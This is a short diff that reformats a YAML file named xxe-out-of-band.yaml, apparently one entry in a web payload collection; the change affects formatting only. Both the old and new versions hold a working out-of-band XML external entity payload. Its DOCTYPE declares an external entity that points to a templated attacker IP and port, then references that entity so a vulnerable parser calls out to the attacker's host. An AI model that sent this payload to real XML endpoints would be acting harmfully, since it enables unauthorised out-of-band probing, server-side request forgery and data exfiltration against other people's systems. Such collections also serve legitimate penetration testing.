@@ -1,14 +1,11 @@
+---
 metadata:
-  filename: xxe-out-of-band.yaml
-  tags:
-  - web
-  created: '2025-03-29'
-  author: Unknown
-content: '<?xml version="1.0" encoding="UTF-8"?>
+  filename: "xxe-out-of-band.yaml"
+  tags: ["web"]
+  created: "2025-03-29"
+  author: "Unknown"
 
-  <!DOCTYPE foo [ <!ENTITY ent SYSTEM "http://{{ attacker_ip }}:{{ delivery_outbound_port
-  }}/outofbounds"> ]>
-
+content: |
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY ent SYSTEM "http://{{ attacker_ip }}:{{ delivery_outbound_port }}/outofbounds"> ]>
   <bar>&ent;</bar>
-
-  '
